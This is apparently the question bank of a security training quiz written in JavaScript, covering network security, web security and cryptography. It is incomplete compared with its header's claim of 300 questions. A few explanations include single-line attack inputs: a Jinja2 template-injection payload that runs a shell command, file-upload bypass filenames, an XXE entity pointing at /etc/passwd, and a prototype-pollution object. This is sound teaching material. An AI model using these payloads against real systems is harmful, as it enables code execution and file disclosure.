// Interactive Security Training Quiz Engine — 300 questions across 15 categories.

const QUESTIONS = [
  // ── Network Security (20) ──
  { question: "What is the primary purpose of ARP (Address Resolution Protocol)?", options: ["Resolve domain names to IP addresses", "Map IP addresses to MAC addresses", "Encrypt network traffic", "Authenticate users on a network"], correct: 1, explanation: "ARP maps IP addresses to MAC addresses on a local network segment. When a device knows the IP but not the MAC address of a destination on the same subnet, it broadcasts an ARP request. ARP has no authentication mechanism, making it vulnerable to ARP spoofing/poisoning attacks.", difficulty: "easy", category: "Network Security", tags: ["ARP", "Layer 2", "MAC"], references: ["RFC 826"] },
  { question: "Which port does HTTPS use by default?", options: ["80", "8080", "443", "8443"], correct: 2, explanation: "HTTPS uses TCP port 443 by default. HTTP uses port 80. Ports 8080 and 8443 are common alternative ports for HTTP and HTTPS respectively, often used by web application servers and proxies.", difficulty: "easy", category: "Network Security", tags: ["ports", "HTTPS", "TLS"], references: ["RFC 2818"] },
  { question: "What type of attack involves flooding a network with ICMP echo requests?", options: ["SYN flood", "Smurf attack", "Ping of Death", "Teardrop attack"], correct: 1, explanation: "A Smurf attack floods the target by sending ICMP echo requests to a network's broadcast address with the source IP spoofed to the victim's IP. All hosts on the network reply to the victim, amplifying the traffic. Modern networks typically block directed broadcasts to prevent this.", difficulty: "medium", category: "Network Security", tags: ["DDoS", "ICMP", "amplification"], references: ["CVE-1999-0513"] },
  { question: "What does a stateful firewall track that a packet filter does not?", options: ["Source IP addresses", "Destination ports", "Connection state and context", "Packet payload content"], correct: 2, explanation: "Stateful firewalls maintain a state table tracking the full context of active connections — including TCP sequence numbers, flags, and connection phases. This allows them to make decisions based on whether a packet is part of an established connection, unlike simple packet filters that evaluate each packet independently.", difficulty: "medium", category: "Network Security", tags: ["firewall", "stateful", "packet filter"], references: ["NIST SP 800-41"] },
  { question: "In a VLAN hopping attack using switch spoofing, what does the attacker configure their port as?", options: ["An access port on the target VLAN", "A trunk port using DTP negotiation", "A mirror/SPAN port", "A native VLAN port"], correct: 1, explanation: "In switch spoofing, the attacker configures their interface to negotiate a trunk link using Dynamic Trunking Protocol (DTP). Once trunking is established, the attacker can send 802.1Q-tagged frames to access any VLAN. Mitigation: disable DTP on all access ports with 'switchport mode access' and 'switchport nonegotiate'.", difficulty: "hard", category: "Network Security", tags: ["VLAN", "DTP", "trunk"], references: ["CISCO VLAN Security"] },
  { question: "What is the main difference between IDS and IPS?", options: ["IDS is hardware, IPS is software", "IDS detects threats, IPS prevents them inline", "IDS works at Layer 7, IPS at Layer 3", "IDS uses signatures, IPS uses anomalies"], correct: 1, explanation: "An Intrusion Detection System (IDS) passively monitors traffic and generates alerts but does not block attacks. An Intrusion Prevention System (IPS) sits inline in the traffic flow and can actively block or drop malicious packets. IPS introduces latency since all traffic must pass through it, but provides active defense.", difficulty: "easy", category: "Network Security", tags: ["IDS", "IPS", "detection"], references: ["NIST SP 800-94"] },
  { question: "Which protocol is vulnerable to BGP hijacking?", options: ["DNS", "OSPF", "BGP", "RIP"], correct: 2, explanation: "BGP (Border Gateway Protocol) is vulnerable to route hijacking because it relies on trust between autonomous systems without built-in authentication. An attacker can announce ownership of IP prefixes they don't own, redirecting internet traffic through their network for interception or denial of service. RPKI (Resource Public Key Infrastructure) is the primary mitigation.", difficulty: "hard", category: "Network Security", tags: ["BGP", "routing", "hijacking"], references: ["RFC 7454"] },
  { question: "What does the TTL field in an IP packet indicate?", options: ["Time in seconds before packet expires", "Maximum number of router hops", "Total transmission latency", "TCP timeout value"], correct: 1, explanation: "TTL (Time To Live) specifies the maximum number of router hops a packet can traverse before being discarded. Each router decrements the TTL by 1. When TTL reaches 0, the packet is dropped and an ICMP Time Exceeded message is sent back. This prevents packets from looping indefinitely. Traceroute exploits this mechanism by sending packets with incrementally increasing TTL values.", difficulty: "easy", category: "Network Security", tags: ["IP", "TTL", "routing"], references: ["RFC 791"] },
  { question: "In a DNS amplification DDoS attack, what record type is most commonly abused?", options: ["A record", "CNAME record", "ANY or TXT record", "MX record"], correct: 2, explanation: "DNS amplification attacks typically query for ANY or TXT records because they produce the largest responses relative to the query size. A small 60-byte query can generate a 4000+ byte response, achieving an amplification factor of ~50x. The attacker spoofs the source IP to the victim's address, and the DNS server sends the large response to the victim.", difficulty: "medium", category: "Network Security", tags: ["DDoS", "DNS", "amplification"], references: ["US-CERT TA13-088A"] },
  { question: "What is the purpose of 802.1X in network security?", options: ["VLAN tagging", "Port-based network access control", "Wireless encryption", "Link aggregation"], correct: 1, explanation: "IEEE 802.1X provides port-based network access control (PNAC). It authenticates devices attempting to connect to a LAN or WLAN using EAP (Extensible Authentication Protocol) before granting network access. It involves three parties: the supplicant (client), the authenticator (switch/AP), and the authentication server (RADIUS). Unauthenticated ports only allow EAP traffic.", difficulty: "medium", category: "Network Security", tags: ["802.1X", "NAC", "authentication"], references: ["IEEE 802.1X-2020"] },
  { question: "What is a SYN flood attack?", options: ["Sending malformed SYN packets to crash a server", "Overwhelming a server with half-open TCP connections", "Flooding a network with SYN-ACK packets", "Injecting fake SYN cookies"], correct: 1, explanation: "A SYN flood attack exploits the TCP three-way handshake. The attacker sends many SYN packets with spoofed source IPs. The server responds with SYN-ACK and allocates resources for each half-open connection, waiting for an ACK that never comes. This exhausts the server's connection table. SYN cookies are a defense that avoids allocating resources until the handshake completes.", difficulty: "easy", category: "Network Security", tags: ["DDoS", "TCP", "SYN"], references: ["RFC 4987"] },
  { question: "What protocol does Kerberos use for transport?", options: ["TCP port 88", "UDP port 88 (primarily)", "TCP port 389", "UDP port 636"], correct: 1, explanation: "Kerberos primarily uses UDP port 88 for authentication exchanges, with TCP port 88 as fallback for larger messages. Kerberos provides mutual authentication using tickets issued by a Key Distribution Center (KDC). It is the default authentication protocol in Active Directory environments.", difficulty: "medium", category: "Network Security", tags: ["Kerberos", "authentication", "AD"], references: ["RFC 4120"] },
  { question: "What is the purpose of network segmentation?", options: ["Increase bandwidth", "Reduce collision domains", "Limit the blast radius of security breaches", "Improve DNS resolution speed"], correct: 2, explanation: "Network segmentation divides a network into isolated segments to limit the impact of a security breach. If an attacker compromises one segment, they cannot easily move to other segments. This is a fundamental defense-in-depth strategy. Implementation methods include VLANs, firewalls, ACLs, and micro-segmentation.", difficulty: "easy", category: "Network Security", tags: ["segmentation", "defense-in-depth"], references: ["NIST SP 800-125B"] },
  { question: "Which of the following is NOT a valid TCP flag?", options: ["URG (Urgent)", "ECE (ECN-Echo)", "REQ (Request)", "PSH (Push)"], correct: 2, explanation: "REQ is not a valid TCP flag. The valid TCP flags are: SYN (Synchronize), ACK (Acknowledge), FIN (Finish), RST (Reset), PSH (Push), URG (Urgent), ECE (ECN-Echo), CWR (Congestion Window Reduced), and NS (Nonce Sum). These 9 flags each occupy 1 bit in the TCP header.", difficulty: "medium", category: "Network Security", tags: ["TCP", "flags", "protocol"], references: ["RFC 9293"] },
  { question: "What does NAT (Network Address Translation) primarily provide?", options: ["Encryption of network traffic", "Translation between private and public IP addresses", "Load balancing across servers", "DNS resolution caching"], correct: 1, explanation: "NAT translates private IP addresses (RFC 1918: 10.x.x.x, 172.16-31.x.x, 192.168.x.x) to public IP addresses for internet communication. While NAT provides a limited form of security by hiding internal IP addresses, it was designed primarily to conserve IPv4 address space. PAT (Port Address Translation) allows multiple internal hosts to share a single public IP.", difficulty: "easy", category: "Network Security", tags: ["NAT", "IPv4", "addressing"], references: ["RFC 3022"] },
  { question: "What attack exploits the lack of authentication in DHCP?", options: ["DHCP starvation", "DNS poisoning", "ARP spoofing", "IP fragmentation"], correct: 0, explanation: "DHCP starvation attacks exploit the fact that DHCP has no built-in authentication. The attacker floods the DHCP server with requests using spoofed MAC addresses, exhausting the available IP address pool. This prevents legitimate clients from obtaining IP addresses. Often combined with a rogue DHCP server to perform man-in-the-middle attacks. DHCP snooping on switches is the primary defense.", difficulty: "medium", category: "Network Security", tags: ["DHCP", "starvation", "Layer 2"], references: ["CISCO DHCP Snooping"] },
  { question: "In the OSI model, at which layer does TLS/SSL operate?", options: ["Layer 3 (Network)", "Layer 4 (Transport)", "Between Layer 4 and Layer 7 (Session/Presentation)", "Layer 7 (Application)"], correct: 2, explanation: "TLS/SSL doesn't fit neatly into a single OSI layer. It operates above the transport layer (Layer 4/TCP) but below the application layer (Layer 7), roughly corresponding to the Session and Presentation layers (Layers 5-6). It provides encryption, authentication, and integrity for data transmitted between applications over TCP.", difficulty: "medium", category: "Network Security", tags: ["TLS", "SSL", "OSI"], references: ["RFC 8446"] },
  { question: "What is the purpose of a honeypot in network security?", options: ["Filter malicious traffic", "Attract and analyze attacker behavior", "Encrypt sensitive data at rest", "Load balance incoming connections"], correct: 1, explanation: "A honeypot is a decoy system designed to attract attackers and study their methods, tools, and tactics. It has no legitimate production purpose, so any interaction with it is suspicious by definition. Honeypots can be low-interaction (simulating services) or high-interaction (full systems). They provide valuable threat intelligence but must be carefully isolated to prevent attackers from using them as pivot points.", difficulty: "easy", category: "Network Security", tags: ["honeypot", "deception", "threat intelligence"], references: ["NIST SP 800-83"] },
  { question: "What is the difference between a hub and a switch from a security perspective?", options: ["Hubs encrypt traffic, switches don't", "Switches forward traffic only to the destination port, hubs broadcast to all ports", "Hubs support VLANs, switches don't", "Switches are wireless, hubs are wired"], correct: 1, explanation: "A hub broadcasts all traffic to every connected port, meaning any device can sniff all network traffic (making packet capture trivial). A switch learns MAC addresses and forwards frames only to the specific port where the destination device is connected, significantly reducing the ability to passively sniff traffic. However, switches can still be attacked via MAC flooding, ARP spoofing, or port mirroring.", difficulty: "easy", category: "Network Security", tags: ["hub", "switch", "sniffing"], references: ["Network fundamentals"] },
  { question: "What is a MAC flooding attack?", options: ["Spoofing MAC addresses to bypass NAC", "Overflowing a switch's CAM table to make it act like a hub", "Flooding a network with multicast frames", "Overwhelming a MAC address filter"], correct: 1, explanation: "MAC flooding overwhelms a switch's Content Addressable Memory (CAM) table with thousands of fake MAC addresses. When the CAM table is full, the switch can no longer learn new MAC-to-port mappings and falls back to hub-like behavior, broadcasting frames to all ports. This allows the attacker to sniff all traffic on the switch. Defense: port security limiting MAC addresses per port.", difficulty: "medium", category: "Network Security", tags: ["MAC", "switch", "CAM table"], references: ["CISCO Port Security"] },

  // ── Web Security (20) ──
  { question: "What is the most effective defense against SQL injection?", options: ["Input validation with regex", "Parameterized queries / prepared statements", "Web Application Firewall (WAF)", "Escaping special characters"], correct: 1, explanation: "Parameterized queries (prepared statements) are the most effective defense because they separate SQL code from data. The database treats user input as data values, never as SQL commands, regardless of the content. While WAFs and input validation provide defense-in-depth, they can be bypassed. Escaping is error-prone and not recommended as a primary defense.", difficulty: "easy", category: "Web Security", tags: ["SQLi", "prepared statements", "defense"], references: ["OWASP SQL Injection Prevention"] },
  { question: "What is a Stored XSS attack?", options: ["XSS payload stored in a cookie", "Malicious script permanently stored on the target server and served to other users", "XSS that exploits local storage APIs", "A cached XSS payload in the browser"], correct: 1, explanation: "Stored (Persistent) XSS occurs when malicious script is permanently stored on the target server (e.g., in a database, comment field, or forum post) and served to other users who view the affected page. Unlike Reflected XSS which requires the victim to click a crafted link, Stored XSS attacks every user who views the infected content, making it more dangerous.", difficulty: "easy", category: "Web Security", tags: ["XSS", "stored", "persistent"], references: ["OWASP XSS Prevention"] },
  { question: "What HTTP header prevents clickjacking attacks?", options: ["X-Content-Type-Options", "Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"], correct: 2, explanation: "X-Frame-Options prevents clickjacking by controlling whether a page can be embedded in an iframe. Values: DENY (never framed), SAMEORIGIN (only by same origin), ALLOW-FROM (specific origin, deprecated). CSP's frame-ancestors directive is the modern replacement. Clickjacking tricks users into clicking hidden UI elements overlaid with transparent iframes.", difficulty: "medium", category: "Web Security", tags: ["clickjacking", "headers", "iframe"], references: ["RFC 7034"] },
  { question: "What is Server-Side Request Forgery (SSRF)?", options: ["Forging HTTP responses from the server", "Tricking the server into making requests to unintended locations", "Spoofing the server's SSL certificate", "Injecting malicious server-side code"], correct: 1, explanation: "SSRF occurs when an attacker can make the server-side application send HTTP requests to an attacker-chosen destination. This can be used to access internal services, cloud metadata endpoints (169.254.169.254), or scan internal networks. The Capital One breach (2019) exploited SSRF to access AWS metadata and steal 100M+ records. Defense: URL allowlisting, disable unnecessary URL schemes, network segmentation.", difficulty: "medium", category: "Web Security", tags: ["SSRF", "server-side", "cloud"], references: ["OWASP SSRF", "CWE-918"] },
  { question: "What does the SameSite cookie attribute prevent?", options: ["Cookie theft via XSS", "Cross-site request forgery (CSRF)", "Session fixation", "Cookie poisoning"], correct: 1, explanation: "The SameSite cookie attribute prevents CSRF by controlling when cookies are sent in cross-site requests. SameSite=Strict never sends cookies cross-site. SameSite=Lax sends cookies only with top-level navigations (GET). SameSite=None sends cookies cross-site but requires Secure flag. Modern browsers default to Lax when no SameSite is set.", difficulty: "medium", category: "Web Security", tags: ["CSRF", "cookies", "SameSite"], references: ["RFC 6265bis"] },
  { question: "What is the purpose of Content-Security-Policy (CSP)?", options: ["Encrypt HTTP content", "Define which content sources the browser should trust", "Set content encoding for compression", "Enforce content access control lists"], correct: 1, explanation: "CSP is an HTTP header that tells the browser which sources of content (scripts, styles, images, fonts, etc.) are trusted for the current page. It mitigates XSS by preventing inline scripts and restricting script sources to allowlisted domains. Example: script-src 'self' cdn.example.com prevents scripts from any other source. CSP can also prevent data exfiltration via connect-src.", difficulty: "medium", category: "Web Security", tags: ["CSP", "XSS", "headers"], references: ["MDN CSP", "CWE-79"] },
  { question: "What is an IDOR vulnerability?", options: ["Insecure Direct Object Reference — accessing objects by manipulating identifiers", "Internal Domain Object Restriction bypass", "Indirect Data Object Redirection attack", "Insecure Default Object Routing"], correct: 0, explanation: "IDOR (Insecure Direct Object Reference) occurs when an application exposes internal object references (database IDs, filenames) in URLs or parameters without proper authorization checks. An attacker can manipulate these references to access other users' data. Example: changing /api/user/123/profile to /api/user/124/profile to access another user's profile. Defense: authorization checks on every request, indirect references.", difficulty: "easy", category: "Web Security", tags: ["IDOR", "authorization", "access control"], references: ["OWASP IDOR", "CWE-639"] },
  { question: "What makes DOM-based XSS different from Reflected XSS?", options: ["DOM XSS uses cookies, Reflected uses URL parameters", "DOM XSS payload never reaches the server — it's processed entirely in the browser", "DOM XSS only affects Internet Explorer", "DOM XSS requires authentication"], correct: 1, explanation: "DOM-based XSS occurs when client-side JavaScript processes untrusted data (from the URL hash, document.referrer, postMessage, etc.) and writes it to the DOM without sanitization. The malicious payload never reaches the server — the entire vulnerability is in the client-side code. This makes it invisible to server-side WAFs and log analysis. Example: document.getElementById('output').innerHTML = location.hash.slice(1).", difficulty: "hard", category: "Web Security", tags: ["XSS", "DOM", "client-side"], references: ["OWASP DOM XSS", "CWE-79"] },
  { question: "What is the purpose of a CSRF token?", options: ["Encrypt form data", "Prove the request originated from the legitimate application", "Authenticate the user's identity", "Prevent SQL injection in forms"], correct: 1, explanation: "A CSRF (Cross-Site Request Forgery) token is a unique, unpredictable value generated server-side and embedded in forms. When the form is submitted, the server verifies the token matches the one it issued. Since an attacker on a different origin cannot read the token, they cannot forge a valid request. Tokens should be per-session or per-request, cryptographically random, and tied to the user's session.", difficulty: "easy", category: "Web Security", tags: ["CSRF", "token", "defense"], references: ["OWASP CSRF Prevention"] },
  { question: "What is the security risk of using eval() in JavaScript?", options: ["It slows down page rendering", "It can execute arbitrary code from untrusted input, leading to XSS/RCE", "It breaks Content Security Policy", "It disables the browser's same-origin policy"], correct: 1, explanation: "eval() executes a string as JavaScript code. If any part of that string comes from user input, URL parameters, cookies, or other untrusted sources, an attacker can inject arbitrary code. This leads to XSS in browsers or RCE in server-side JavaScript (Node.js). Even indirect eval (new Function(), setTimeout with string argument) has the same risk. CSP script-src without 'unsafe-eval' blocks eval.", difficulty: "medium", category: "Web Security", tags: ["eval", "XSS", "JavaScript"], references: ["CWE-95"] },
  { question: "What is HTTP request smuggling?", options: ["Hiding malicious payloads in HTTP headers", "Exploiting discrepancies in how front-end and back-end servers parse HTTP requests", "Tunneling non-HTTP traffic inside HTTP requests", "Sending HTTP requests over non-standard ports"], correct: 1, explanation: "HTTP request smuggling exploits differences in how front-end (reverse proxy/load balancer) and back-end servers determine where one HTTP request ends and the next begins. By crafting ambiguous requests (using conflicting Content-Length and Transfer-Encoding headers), an attacker can 'smuggle' a second request inside the first, potentially bypassing security controls, poisoning caches, or hijacking other users' requests.", difficulty: "hard", category: "Web Security", tags: ["smuggling", "HTTP", "desync"], references: ["PortSwigger Research"] },
  { question: "What is the purpose of Subresource Integrity (SRI)?", options: ["Verify the integrity of external resources loaded by a web page", "Enforce same-origin policy for subresources", "Encrypt resources in transit", "Compress resources for faster loading"], correct: 0, explanation: "SRI allows browsers to verify that resources fetched from CDNs or third-party origins haven't been tampered with. The HTML tag includes a cryptographic hash of the expected content: <script src='cdn.js' integrity='sha384-...' crossorigin='anonymous'>. If the fetched content doesn't match the hash, the browser refuses to execute it. This protects against compromised CDNs or supply chain attacks.", difficulty: "medium", category: "Web Security", tags: ["SRI", "integrity", "CDN"], references: ["MDN SRI", "W3C SRI"] },
  { question: "What is a race condition vulnerability in web applications?", options: ["A bug caused by CSS animation timing", "A flaw where the outcome depends on the timing of concurrent operations", "A vulnerability in WebSocket race detection", "An error in JavaScript event loop handling"], correct: 1, explanation: "Race conditions occur when the outcome of an operation depends on the timing of concurrent events. In web apps, this can allow: double-spending (withdrawing money twice before balance updates), bypassing rate limits (sending requests simultaneously), coupon reuse, or TOCTOU (time-of-check-to-time-of-use) authorization bypasses. Defense: database transactions, advisory locks, idempotency keys, atomic operations.", difficulty: "hard", category: "Web Security", tags: ["race condition", "TOCTOU", "concurrency"], references: ["CWE-362", "PortSwigger Race Conditions"] },
  { question: "What is the primary risk of allowing file uploads without proper validation?", options: ["Increased storage costs", "Remote Code Execution via uploaded web shells", "Slow page loading", "Database corruption"], correct: 1, explanation: "Unrestricted file upload is critical because attackers can upload web shells (PHP, JSP, ASPX) that execute server-side code. Even with extension checks, bypasses exist: double extensions (shell.php.jpg), null bytes (shell.php%00.jpg), content-type manipulation, and .htaccess overrides. Defense: allowlist extensions, validate content type AND magic bytes, store outside web root, rename files, scan for malware.", difficulty: "medium", category: "Web Security", tags: ["file upload", "web shell", "RCE"], references: ["OWASP Unrestricted File Upload", "CWE-434"] },
  { question: "What does HSTS (HTTP Strict Transport Security) enforce?", options: ["HTTP/2 protocol usage", "HTTPS-only connections for the domain", "Strong cipher suite selection", "Certificate pinning"], correct: 1, explanation: "HSTS tells browsers to only connect to the site via HTTPS, even if the user types http:// or clicks an HTTP link. The Strict-Transport-Security header sets a max-age during which the browser automatically upgrades all requests to HTTPS. The includeSubDomains directive covers all subdomains. HSTS preloading embeds the policy in browser source code, protecting even the first visit.", difficulty: "easy", category: "Web Security", tags: ["HSTS", "HTTPS", "TLS"], references: ["RFC 6797"] },
  { question: "What is Server-Side Template Injection (SSTI)?", options: ["Injecting HTML templates into the DOM", "Exploiting template engines to execute server-side code", "Modifying email templates stored on the server", "Injecting CSS into server-rendered pages"], correct: 1, explanation: "SSTI occurs when user input is embedded directly into a server-side template (Jinja2, Twig, Freemarker, Velocity, etc.) and processed by the template engine. Since template engines often have access to the server's runtime environment, this can lead to Remote Code Execution. Example in Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Defense: never pass user input directly into templates, use sandboxed template engines.", difficulty: "hard", category: "Web Security", tags: ["SSTI", "template injection", "RCE"], references: ["PortSwigger SSTI", "CWE-1336"] },
  { question: "What is the Same-Origin Policy (SOP)?", options: ["A server-side access control mechanism", "A browser security mechanism that restricts how documents from one origin can interact with resources from another origin", "A DNS policy preventing zone transfers", "A TLS certificate validation rule"], correct: 1, explanation: "SOP is a fundamental browser security mechanism. It restricts scripts from one origin (scheme + host + port) from reading data from a different origin. For example, JavaScript on evil.com cannot read responses from bank.com. SOP does not prevent sending requests (which is why CSRF works), only reading responses. CORS (Cross-Origin Resource Sharing) headers allow servers to selectively relax SOP.", difficulty: "medium", category: "Web Security", tags: ["SOP", "CORS", "browser security"], references: ["MDN Same-Origin Policy"] },
  { question: "What is a JWT (JSON Web Token) algorithm confusion attack?", options: ["Using weak encryption algorithms", "Tricking the server into using a symmetric algorithm (HS256) with the public key as the secret", "Confusing base64 and base64url encoding", "Mixing up JWT header and payload"], correct: 1, explanation: "JWT algorithm confusion exploits servers that accept both RS256 (asymmetric) and HS256 (symmetric). The attacker takes the server's public key (which is often publicly available), creates a token signed with HS256 using the public key as the HMAC secret. If the server uses the public key for both RS256 verification and HS256 HMAC checking, the forged token is accepted. Defense: explicitly specify and validate the expected algorithm server-side.", difficulty: "hard", category: "Web Security", tags: ["JWT", "algorithm confusion", "authentication"], references: ["Auth0 JWT Vulnerabilities", "CWE-327"] },
  { question: "What is XML External Entity (XXE) injection?", options: ["Injecting XML tags into HTML pages", "Exploiting XML parsers to read local files, perform SSRF, or cause denial of service", "Modifying XML schema definitions", "Injecting external CSS into XML documents"], correct: 1, explanation: "XXE exploits XML parsers that process external entity declarations. An attacker crafts XML with a DTD defining an external entity pointing to a local file (file:///etc/passwd) or internal URL. When the parser processes the entity, it reads the file/URL and includes the content in the response. This can lead to file disclosure, SSRF, or DoS (billion laughs attack). Defense: disable DTD processing and external entities in the XML parser.", difficulty: "medium", category: "Web Security", tags: ["XXE", "XML", "file disclosure"], references: ["OWASP XXE", "CWE-611"] },
  { question: "What is prototype pollution in JavaScript?", options: ["Memory leak in the prototype chain", "Injecting properties into Object.prototype that affect all objects", "Corrupting the JavaScript engine's prototype cache", "Overloading constructor functions"], correct: 1, explanation: "Prototype pollution occurs when an attacker can inject properties into Object.prototype (or other built-in prototypes) through unsafe object merging, deep clone, or parameter parsing. Since all JavaScript objects inherit from Object.prototype, the injected property appears on every object. This can lead to XSS, authentication bypass, RCE in Node.js (via child_process options), or DoS. Example: merging {__proto__: {isAdmin: true}} into a user object.", difficulty: "hard", category: "Web Security", tags: ["prototype pollution", "JavaScript", "Node.js"], references: ["CWE-1321", "Snyk Prototype Pollution"] },

  // ── Cryptography (15) ──
  { question: "What is the key difference between symmetric and asymmetric encryption?", options: ["Symmetric is faster, asymmetric is slower", "Symmetric uses one key for both operations, asymmetric uses a key pair", "Symmetric is for files, asymmetric is for network traffic", "Symmetric is unbreakable, asymmetric can be broken"], correct: 1, explanation: "Symmetric encryption uses the same key for encryption and decryption (AES, ChaCha20). Asymmetric uses a key pair — public key for encryption, private key for decryption (RSA, ECC). Symmetric is ~1000x faster but requires secure key exchange. In practice, TLS uses asymmetric to exchange a symmetric session key, then symmetric for bulk data encryption (hybrid approach).", difficulty: "easy", category: "Cryptography", tags: ["symmetric", "asymmetric", "encryption"], references: ["NIST SP 800-175B"] },
  { question: "Why is ECB (Electronic Codebook) mode considered insecure?", options: ["It's too slow for modern hardware", "Identical plaintext blocks produce identical ciphertext blocks, revealing patterns", "It doesn't use an initialization vector", "It only works with DES, not AES"], correct: 1, explanation: "ECB mode encrypts each block independently with the same key. This means identical plaintext blocks always produce identical ciphertext blocks, preserving patterns in the data. The classic demonstration is the ECB penguin — encrypting a bitmap image with ECB mode clearly shows the penguin outline in the ciphertext. Use CBC, CTR, or GCM mode instead.", difficulty: "medium", category: "Cryptography", tags: ["ECB", "block cipher", "modes"], references: ["NIST SP 800-38A"] },
  { question: "What is a hash collision?", options: ["When two different inputs produce the same hash output", "When a hash function produces an error", "When two hash functions produce the same result", "When a hash is computed twice on the same input"], correct: 0, explanation: "A hash collision occurs when two different inputs produce the same hash value. While collisions are theoretically inevitable (pigeonhole principle), cryptographic hash functions are designed to make finding collisions computationally infeasible. MD5 and SHA-1 are broken — practical collision attacks exist. SHA-256 and SHA-3 are currently collision-resistant. Collisions can be exploited to forge digital signatures or certificates.", difficulty: "easy", category: "Cryptography", tags: ["hash", "collision", "integrity"], references: ["SHAttered attack (SHA-1)"] },
  { question: "What is a padding oracle attack?", options: ["Exploiting error messages to decrypt data one byte at a time", "Attacking the random padding in RSA", "Exploiting buffer overflow in padding functions", "Brute-forcing encryption padding"], correct: 0, explanation: "A padding oracle attack exploits a server that reveals whether the padding of a decrypted ciphertext is valid (via different error messages, timing, or behavior). By manipulating ciphertext bytes and observing responses, an attacker can decrypt the entire message one byte at a time without knowing the key. Affects CBC mode with PKCS#7 padding. The POODLE attack exploited this in SSLv3. Defense: use authenticated encryption (GCM), constant-time padding validation.", difficulty: "hard", category: "Cryptography", tags: ["padding oracle", "CBC", "side-channel"], references: ["Vaudenay 2002", "CVE-2014-3566 POODLE"] },
  { question: "What is Perfect Forward Secrecy (PFS)?", options: ["Guaranteeing messages cannot be replayed", "Ensuring session keys cannot be compromised even if the server's long-term private key is later compromised", "Encrypting messages so they can only be read once", "Using quantum-resistant algorithms"], correct: 1, explanation: "PFS ensures that compromising a server's long-term private key doesn't compromise past session keys. This is achieved by using ephemeral Diffie-Hellman (DHE or ECDHE) key exchange — a new key pair is generated for each session and discarded after. Without PFS (using RSA key exchange), an attacker who records encrypted traffic and later steals the private key can decrypt all past sessions.", difficulty: "medium", category: "Cryptography", tags: ["PFS", "Diffie-Hellman", "TLS"], references: ["RFC 8446 (TLS 1.3)"] },
  { question: "Why should you never use MD5 for password hashing?", options: ["MD5 produces hashes that are too short", "MD5 is too fast, enabling rapid brute force, and has known collision vulnerabilities", "MD5 is not supported by modern operating systems", "MD5 requires too much memory"], correct: 1, explanation: "MD5 is unsuitable for password hashing for two reasons: 1) It's extremely fast (~10 billion hashes/second on a GPU), making brute force and dictionary attacks trivial. 2) It has known collision and preimage vulnerabilities. Password hashing requires deliberately slow algorithms: bcrypt, scrypt, or Argon2. These include configurable work factors, salting, and memory-hardness to resist GPU/ASIC attacks.", difficulty: "easy", category: "Cryptography", tags: ["MD5", "password hashing", "bcrypt"], references: ["OWASP Password Storage", "CWE-328"] },
  { question: "What is the purpose of a salt in password hashing?", options: ["Make the hash longer and harder to brute force", "Prevent identical passwords from producing identical hashes, defeating rainbow tables", "Add encryption on top of hashing", "Replace the need for a pepper"], correct: 1, explanation: "A salt is a unique random value prepended to each password before hashing. This ensures that even if two users have the same password, their stored hashes are different. Salts defeat precomputed attacks (rainbow tables) because the attacker would need a separate table for each possible salt value. Salts are stored alongside the hash (they don't need to be secret). Each password must have its own unique salt.", difficulty: "easy", category: "Cryptography", tags: ["salt", "password", "rainbow table"], references: ["OWASP Password Storage"] },
  { question: "What is the Diffie-Hellman key exchange vulnerable to?", options: ["Brute force attacks", "Man-in-the-middle attacks (without authentication)", "Side-channel attacks only", "Quantum computing only"], correct: 1, explanation: "Basic Diffie-Hellman establishes a shared secret over an insecure channel but provides no authentication. A man-in-the-middle can intercept and establish separate DH exchanges with each party, relaying modified messages between them. Defense: authenticate the DH exchange using digital signatures (as done in TLS), certificates, or pre-shared keys. Authenticated DH (like ECDHE in TLS 1.3) is not vulnerable to MITM.", difficulty: "medium", category: "Cryptography", tags: ["Diffie-Hellman", "MITM", "key exchange"], references: ["RFC 7919"] },
  { question: "What key length is recommended for RSA in 2024+?", options: ["1024 bits", "2048 bits minimum, 3072+ recommended", "512 bits", "4096 bits mandatory"], correct: 1, explanation: "NIST recommends a minimum of 2048-bit RSA keys, with 3072 bits recommended for security beyond 2030. 1024-bit RSA is considered broken and should never be used. 4096-bit keys provide the highest security but with performance trade-offs. For better performance with equivalent security, consider ECDSA/EdDSA with 256-bit curves (equivalent to ~3072-bit RSA).", difficulty: "easy", category: "Cryptography", tags: ["RSA", "key length", "NIST"], references: ["NIST SP 800-57"] },
  { question: "What is AES-GCM?", options: ["A key exchange protocol", "An authenticated encryption mode combining AES-CTR encryption with GMAC authentication", "A hash function based on AES", "A digital signature algorithm"], correct: 1, explanation: "AES-GCM (Galois/Counter Mode) provides authenticated encryption with associated data (AEAD). It combines CTR mode encryption for confidentiality with GMAC for integrity and authenticity, in a single pass. GCM is the most widely used AEAD mode in TLS 1.3. It requires a unique nonce (IV) for each encryption — nonce reuse is catastrophic (allows key recovery). GCM is hardware-accelerated on modern CPUs (AES-NI).", difficulty: "medium", category: "Cryptography", tags: ["AES", "GCM", "AEAD"], references: ["NIST SP 800-38D"] },
  { question: "What is a digital certificate used for?", options: ["Encrypting files on disk", "Binding a public key to an identity, verified by a Certificate Authority", "Storing passwords securely", "Generating random numbers"], correct: 1, explanation: "A digital certificate (X.509) binds a public key to an identity (domain name, organization) and is signed by a trusted Certificate Authority (CA). The certificate contains: subject, public key, issuer (CA), validity period, serial number, and the CA's digital signature. Browsers trust a set of root CAs; if a site's certificate chains to a trusted root, the browser trusts the site's public key for TLS.", difficulty: "easy", category: "Cryptography", tags: ["certificate", "PKI", "X.509"], references: ["RFC 5280"] },
  { question: "What cryptographic attack does quantum computing threaten most?", options: ["Symmetric encryption (AES)", "Asymmetric encryption (RSA, ECC) via Shor's algorithm", "Hash functions (SHA-256)", "Random number generation"], correct: 1, explanation: "Shor's algorithm on a sufficiently powerful quantum computer can factor large numbers and compute discrete logarithms in polynomial time, breaking RSA, DSA, ECDSA, and DH. Symmetric algorithms are less affected — Grover's algorithm halves the effective key length (AES-256 → 128-bit security, still safe). NIST has standardized post-quantum algorithms: CRYSTALS-Kyber (key exchange) and CRYSTALS-Dilithium (signatures) for the transition to quantum-resistant cryptography.", difficulty: "hard", category: "Cryptography", tags: ["quantum", "Shor", "post-quantum"], references: ["NIST PQC", "FIPS 203/204/205"] },
